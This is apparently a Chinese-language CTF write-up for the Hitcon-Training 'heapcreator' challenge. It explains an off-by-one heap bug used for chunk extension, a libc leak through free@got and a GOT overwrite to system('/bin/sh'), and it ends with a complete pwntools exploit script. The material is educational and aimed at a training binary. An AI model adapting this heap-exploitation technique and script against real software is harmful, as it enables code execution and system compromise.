---
title: heapcreator
categories: 
- Hitcon-Training
---
# heapcreator

## 前言

一道chunk extend的题，记录一下思路

## 程序逻辑

程序一共有几个功能，分别是新建chunk，编辑chunk，打印chunk的大小和内容，删除chunk。一般来说有输出函数可以利用其泄露Libc地址等

![main](./1.jpg)

create函数里使用一个全局变量heaparray存储node，heaparray[i]表示第i个node，每个Node为固定分配0x10大小的结构体，结构体第一个成员为size，第二个成员为addr，用来表示被分配的chunk的大小和地址。这里注意是先写入Node的值再获取chunk的内容，且Node的分配在chunk前。

![create](./2.jpg)

show函数输出分配chunk的大小和地址，输出前判断heaparray所在位置的值是否为空，由于被删除chunk的node也会被清空，因此这个避免了输出free之后chunk的内容

![show](./3.jpg)

edit函数存在null-byte-one漏洞，可以多写入一个字节

![edit](./4.jpg)

delete函数删除heap

![delete](./5.jpg)

## 漏洞利用

程序比较大的问题就是这个null-byte-one。我们之前学过chunk的使用存在空间复用，对于按次序分配的chunk1和chunk2，如果chunk1是分配过的chunk，那么chunk2的size部分可以表明chunk1已经被分配，故其free的时候不需要考虑和chunk1的合并，因此chunk2的prev_size成员没有意义，故这部分空间被chunk1使用，也就是说如果我们可以多写入一个字节的话实际上我们可以修改chunk2的size的最后一个字节，之前的写入'\x00'从而unlink就是利用这个原理

具体而言，我们先create两个chunk，第一个size为0x18，第二个为0x10这时程序的地址情况如下图所示，0x603000和0x603040为node地址，0x603030和0x603070是chunk的内容地址。
正常来说，由于对齐，0x18+0x10的head应该会得到大小为0x30的chunk，但是由于之前说的空间复用，0x20的chunk即可满足0x18内容要求。

![array](./6.jpg)

![heap](./7.jpg)

![heaps](./8.jpg)

使用edit我们可以覆盖掉node的头部的size的部分，现在考虑一下我们的需求，首先是泄露libc地址，这个地址如果考虑利用show泄露的话，我们需要在node的内容里填上用过的函数地址，但是node的内容是malloc得到的地址，我们之前用过doubel free修改被释放空闲块的fd的方式诱使分配我们构造的fake chunk，这里不存在这样的利用机会，需要换个思路，如先malloc正常的地址，但是我们使用edit函数修改node的值，这就是chunk extend的目的。
具体地，我们按开始的方式edit(chunk0)来修改node1的size为0x41，之后free(chunk1)。create()开始的malloc的node大小为0x20，而刚刚free的chunk1的大小也是0x20，因此新的node1实际上为之前free的chunk1，再malloc(30)的时候，由于我们修改了前面的size，这次malloc的chunk1就是之前释放的node1，但是不巧的是这里的新chunk1大小为0x41,已经可以覆写新node1，我们修改Node1的内容为free@got，泄露地址，再edit将free@got改成system@plt，把chunk0的内容预先设置为'/bin/sh\x00'，free(chunk0)即可调用system('/bin/sh')

## exp.py

```py
#coding=utf-8
from pwn import *
debug = 0
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
p = process('./heapcreator')
elf = ELF('./heapcreator')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    gdb.attach(p)

def Create(size,content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size of Heap : ')
    p.sendline(str(size))
    p.recvuntil('Content of heap:')
    p.send(content)

def Edit(index,content):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))
    p.recvuntil('Content of heap : ')
    p.send(content)

def Show(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))

def Delete(index):
    p.recvuntil('Your choice :')
    p.sendline('4')
    p.recvuntil('Index :')
    p.sendline(str(index))

def Exit():
    p.recvuntil('Your choice :')
    p.sendline('5')

## leak libc
Create(0x18,'a'*4)#idx0
Create(0x10,'a'*4)#idx1
Edit(0,'/bin/sh\x00'+'a'*0x10+'\x41')#hack the size
Delete(1)
free_got = elf.got['free']
Create(0x30,p64(0)*4+p64(0x30)+p64(free_got))
Show(1)
p.recvuntil('Content : ')
free_addr = u64(p.recvline().strip('\n').ljust(8,'\x00'))
libc_base = free_addr - libc.symbols['free']

log.success('libc base => ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
## get shell
Edit(1,p64(system_addr))
## trigger 
Delete(0)

p.interactive()
```
